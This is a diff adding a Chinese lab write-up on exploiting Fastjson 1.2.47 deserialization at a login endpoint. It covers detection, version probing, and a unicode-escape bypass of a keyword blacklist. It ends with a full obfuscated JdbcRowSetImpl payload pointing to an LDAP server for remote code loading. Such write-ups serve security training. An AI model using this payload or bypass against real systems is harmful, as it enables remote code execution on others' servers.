@@ -1,0 +1,35 @@
+进入首页，点击登录，
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696340742216-98ab8e33-40a2-420f-8873-1c37723fd326.png#averageHue=%231b1610&clientId=u32935a5a-49f2-4&from=paste&height=702&id=u057fbb53&originHeight=877&originWidth=1728&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=3044655&status=done&style=none&taskId=u23da4fb0-1ebf-45e9-b3cb-b466b427bf8&title=&width=1382.4)
+在登录处抓包，发现为Json格式传入参数：
+![](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693192153552-521f193f-9d9a-4db4-ba41-660711b12100.png#averageHue=%23fbfbfb&from=url&id=uUIjl&originHeight=155&originWidth=572&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)
+既然是Json格式自然优先尝试是否是Fastjson。
+判断是否为Fastjson：删掉末尾的`}`或添加`"`,使其解析报错。这种情况下就代表后端是解析了这段Json,另一种方法可以使用Dnslog探测。确定后端使用的Fastjson，下一步就是探测具体版本。
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696338224716-94e62dab-b13c-4acd-9205-14373c2141ef.png#averageHue=%23fefcfc&clientId=u46719c6f-761b-4&from=paste&height=188&id=u3f2b5343&originHeight=235&originWidth=1321&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31789&status=done&style=none&taskId=u7780d62d-789e-4e3c-a08d-c57a177eac5&title=&width=1056.8)
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696338186228-cc190699-bd01-4e16-b6b3-d6981663e14c.png#averageHue=%23fdfdfd&clientId=u46719c6f-761b-4&from=paste&height=172&id=u5517cf1d&originHeight=215&originWidth=1180&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=29810&status=done&style=none&taskId=ucacd91ed-97fd-4f5d-a60b-0bfaac9e9bb&title=&width=944)
+探测Fastjson精确版本：
+同样也有两种方法，通过报错和Dnslog。
+```json
+{
+  "@type":"java.lang.AutoCloseable"
+```
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696341570631-5eeaf910-1c2e-46e7-ae0a-494ed0783991.png#averageHue=%23fdfcfc&clientId=u4989e2c4-36bc-4&from=paste&height=198&id=u65e3ff90&originHeight=247&originWidth=1207&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=31736&status=done&style=none&taskId=u22e92992-0b09-4bc2-bf09-9264c1c1162&title=&width=965.6)
+从返回的报错可以看到被拦截了。在代码中我将一些会用到的关键字加入了黑名单
+![](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693202415687-e471dfa3-15df-4d7a-8703-e98fb94edbba.png#averageHue=%23302c2c&from=url&id=NBynD&originHeight=252&originWidth=1026&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)
+Fastjson本身是默认识别并解码hex和unicode编码的，所以可以利用这个特性绕过。
+![image.png](https://cdn.nlark.com/yuque/0/2023/png/26045928/1696341866517-a6e2fa2d-a0cc-4ee5-9e0c-2f65627e0d48.png#averageHue=%23fefdfd&clientId=u1700d9e7-e7d8-4&from=paste&height=224&id=ufe11e251&originHeight=280&originWidth=1390&originalType=binary&ratio=1.25&rotation=0&showTitle=false&size=42042&status=done&style=none&taskId=u4dea1d04-f4a6-4281-9c78-407b5a01732&title=&width=1112)
+通过报错，发现版本为1.2.47，很经典的版本漏洞，在这个大版本下存在mappings缓存机制通杀绕过。
+后面的利用就和上个实验一致了，只需该一下编码即可。
+```json
+{
+    "a":{
+        "\u0040\u0074\u0079\u0070\u0065":"\u006A\u0061\u0076\u0061\u002E\u006C\u0061\u006E\u0067\u002E\u0043\u006C\u0061\u0073\u0073",
+        "\u0076\u0061\u006C":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C"
+    },
+    "b":{
+        "\u0040\u0074\u0079\u0070\u0065":"\u0063\u006F\u006D\u002E\u0073\u0075\u006E\u002E\u0072\u006F\u0077\u0073\u0065\u0074\u002E\u004A\u0064\u0062\u0063\u0052\u006F\u0077\u0053\u0065\u0074\u0049\u006D\u0070\u006C",
+        "\u0064\u0061\u0074\u0061\u0053\u006F\u0075\u0072\u0063\u0065\u004E\u0061\u006D\u0065":"\u006C\u0064\u0061\u0070\u003A\u002F\u002F\u0031\u0039\u0032\u002E\u0031\u0036\u0038\u002E\u0030\u002E\u0031\u0030\u0035\u003A\u0031\u0033\u0038\u0039\u002F\u007A\u006B\u0070\u0069\u0078\u0061",
+        "\u0061\u0075\u0074\u006F\u0043\u006F\u006D\u006D\u0069\u0074":"\u0074\u0072\u0075\u0065"
+    }
+}
+```
+![](https://cdn.nlark.com/yuque/0/2023/png/26045928/1693203450654-e122bf7e-7f4f-4c33-ab7c-a5ba0f789b53.png?x-oss-process=image%2Fresize%2Cw_937%2Climit_0#averageHue=%234f5762&from=url&id=Rv8mU&originHeight=141&originWidth=937&originalType=binary&ratio=1.25&rotation=0&showTitle=false&status=done&style=none&title=)
